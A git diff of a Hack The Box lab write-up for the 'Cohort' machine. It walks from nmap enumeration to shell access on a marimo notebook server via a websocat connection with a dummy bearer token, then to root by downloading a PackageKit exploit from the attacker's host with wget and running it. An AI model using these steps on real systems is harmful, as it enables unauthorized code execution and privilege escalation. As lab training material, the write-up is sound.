@@ -1,5 +1,5 @@
 # COHORT-HTB
-
+Needs reviewing of the concepts
 Initial nmap report:
 
 ```bash
@@ -92,7 +92,7 @@ Port 8888 is hosting something called "marimo"
     height: 100vh;
     margin: 0;">
 ```
-If we check for http://0.0.0.0:8888/api/version, we get the answer for 0.20.4. Always check vor the api directories. If we google marimo version 0.20.4 cve we can find this https://github.com/Nxploited/CVE-2026-39987. This CVE can lead to RCE but we cant reach marimo from outside, yet.
+If we check for http://0.0.0.0:8888/api/version, we get the answer for 0.20.4. Always check vor the api directories. If we google marimo version 0.20.4 cve we can find this https://github.com/Nxploited/CVE-2026-39987. This CVE can lead to RCE but we cant reach marimo from outside yet.
 After exploring some more I found that port http://0.0.0.0:80/status can be acessed:
 
 ```bash
@@ -101,42 +101,46 @@ After exploring some more I found that port http://0.0.0.0:80/status can be aces
 There is indeed a vhost: "nb-1be3782a8afd3ad5.cohort.htb" , append it to /etc/hosts and voila, we have access to marimo:
 <img width="1235" height="667" alt="image" src="https://github.com/user-attachments/assets/b5fc6e53-d895-410e-98dd-08dd973b13c9" />
 
+Now we can actually use the CVE We found before, just copy and paste exactly as it is written at the CVE page, there is no need to actually use the CVE-2026-39987.py file there since it is only a scanner for the vulnerability.
+
+
 ```bash
-arning: be sure to add `/home/spaz/.cargo/bin` to your PATH to be able to run the installed binaries
-                                                                                                                                                                                                             
-┌──(spaz㉿kali)-[~/Documents/HTB/Linux/Cohort]
-└─$ websocat "https://nb-1be3782a8afd3ad5.cohort.htb:5000/terminal/ws" -H "Authorization: Bearer any-value" 
-websocat: command not found
-                                                                                                                                                                                                             
-┌──(spaz㉿kali)-[~/Documents/HTB/Linux/Cohort]
-└─$ ls
-                                                                                                                                                                                                             
-┌──(spaz㉿kali)-[~/Documents/HTB/Linux/Cohort]
-└─$ export PATH="$HOME/.cargo/bin:$PATH"
-                                                                                                                                                                                                             
-┌──(spaz㉿kali)-[~/Documents/HTB/Linux/Cohort]
-└─$ websocat "https://nb-1be3782a8afd3ad5.cohort.htb:5000/terminal/ws" -H "Authorization: Bearer any-value"
-Specify ws:// or wss:// URI to connect to a websocket
-websocat: Invalid command-line parameters
-                                                                                                                                                                                                             
-┌──(spaz㉿kali)-[~/Documents/HTB/Linux/Cohort]
-└─$ websocat -H="Authorization: Bearer any-value" \
-wss://nb-1be3782a8afd3ad5.cohort.htb:5000/terminal/ws
-websocat: WebSocketError: Connection refused (os error 111)
-websocat: error running
-                                                                                                                                                                                                             
-┌──(spaz㉿kali)-[~/Documents/HTB/Linux/Cohort]
-└─$ websocat -H="Authorization: Bearer any-value" \
-wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws 
-websocat: WebSocketError: WebSocket SSL error: error:0A000086:SSL routines:tls_post_process_server_certificate:certificate verify failed:../ssl/statem/statem_clnt.c:2125: (self-signed certificate)
-websocat: error running
-                                                                                                                                                                                                             
-┌──(spaz㉿kali)-[~/Documents/HTB/Linux/Cohort]
-└─$ websocat -k \
-  -H="Authorization: Bearer any-value" \
-  wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
+# Install websocat
+cargo install websocat
 ```
-ON HOLD ADD EVERYTHING TO GLOSSARY
+You might need to append cargo to your PATH.
+```bash
+export PATH="$PATH:/home/spaz/.cargo/bin"
+```
+Then you can connect:
+
+```bash
+websocat -k "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws" -H "Authorization: Bearer any-value"
+```
+And then you have user flag:
+<img width="1662" height="190" alt="image" src="https://github.com/user-attachments/assets/822dbd6a-0c21-43ca-ab97-ebfc366ce1cf" />
+
+*Privilege escalation*
+
+After some lenghty system enumeration, we found the PackageKit version: packagekit 1.2.8. If we google this version'll find the CVE-2026-41651 that leads to privesc via TOCTOU.
+Very simple to use, just clone this at your machine first:
+```bash
+git clone https://github.com/0xBlackash/CVE-2026-41651
+cd CVE-2026-41651
+python -m http.server
+```
+Then, at marimo:
+
+```bash
+wget http://10.10.16.250:8000/CVE-2026-41651.py
+chmod +x CVE-2026-41651.py
+python3 CVE-2026-41651.py
+```
+
+And get root:
+<img width="1908" height="312" alt="image" src="https://github.com/user-attachments/assets/3c908829-29b8-44b1-ba09-6f84347bcc89" />
+
+
 
 
 
